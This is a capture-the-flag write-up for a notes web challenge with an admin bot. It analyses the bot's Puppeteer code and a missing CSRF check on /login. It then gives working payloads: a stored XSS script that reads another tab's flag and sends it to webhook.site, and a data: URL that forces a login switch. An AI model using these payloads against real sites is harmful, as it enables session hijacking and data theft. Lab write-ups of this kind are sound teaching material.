## Enumeration
We receive the source code, two interesting files including `report.js` and `web.js`

```javascript
async function run(url) {

  let browser;

  

  try {

    module.exports.open = true;

    browser = await puppeteer.launch({

      headless: true,

      pipe: true,

      args: ['--incognito', '--no-sandbox', '--disable-setuid-sandbox'],

      slowMo: 10

    });

  

    let page = (await browser.pages())[0]

  

    await page.goto('http://0.0.0.0:8080/register');

    await page.type('[name="username"]', crypto.randomBytes(8).toString('hex'));

    await page.type('[name="password"]', crypto.randomBytes(8).toString('hex'));

  

    await Promise.all([

      page.click('[type="submit"]'),

      page.waitForNavigation({ waituntil: 'domcontentloaded' })

    ]);

  

    await page.goto('http://0.0.0.0:8080/new');

    await page.type('[name="title"]', 'flag');

    await page.type('[name="content"]', process.env.FLAG ?? 'ctf{flag}');

  

    await Promise.all([

      page.click('[type="submit"]'),

      page.waitForNavigation({ waituntil: 'domcontentloaded' })

    ]);

  

    await page.goto('about:blank')

    await page.goto(url);

    await page.waitForTimeout(7500);

  

    await browser.close();

  } catch(e) {

    console.error(e);

    try { await browser.close() } catch(e) {}

  }

  

  module.exports.open = false;

}

  

module.exports = { open: false, run }
```

This code means that, whenever we make a POST request to the `/report`, what's gonna happen is:
1. it registers for a new account, kinda like a bot
2. After successfully register, it goes to the `/new` route create a note called `flag` with the flag's content inside
3. After this, it goes to a blank tab, then navigates to whatever we put in the url input


An interesting thing about the other file, `web.js` is that some routes needs a csrf token
![[Pasted image 20250307193332.png]]

But `/login` doesn't. One more and the final notable thing is that, this website is XSS vulnerable
![[Pasted image 20250307193440.png]]

Ultimately, the attack vector would be:
1. Create an account
2. Create a note that leads to our web server/webhook and attach the flag content there
3. Create a payload to input in the `/report` path so that it opens that admin's flag and navigate to our payload

## Exploitation
The note's content would be
```javascript
<script>
if (window.location.search.includes("account_name")) { // This will look for the account_name in the current tab's URL string after the `?`
	window.location ="https://webhook.site/code?" + window.open("", flag).document.body.textContent // this will navigate to our webhook with the flag content appended by opening the tab whose name is flag
}
</script>
```

The URL (for the report) would be:
```Javascript
data:text/html,
<form action="http://0.0.0.0:8080/login" method=POST id="loginform" target="_blank">

  <input type="text" name="username" value="account_name"><input type="text" name="password" value="account_password">
</form> 
// Create a form element so we can submit it later

<script>

  window.open("http://0.0.0.0:8080/notes","flag"); // this will open another tab of the bot at the notes and name this tab flag so that the note's payload can work.
// Another thing to know is that when we change user, unless we reload, the content on this tab won't change (browser's behaviour)
  setTimeout(function() {loginform.submit()},1000); // we will login to our account

  setTimeout(function() {window.location="http://0.0.0.0:8080/notes?account_name"},2000); // we will navigate to the notes so the payload can execute. And since the URL now (on the bot's side, there are 2 tabs. This and its notes) contains the account_name which satisfies the condition, will give us the flag in the webhook.

</script>
```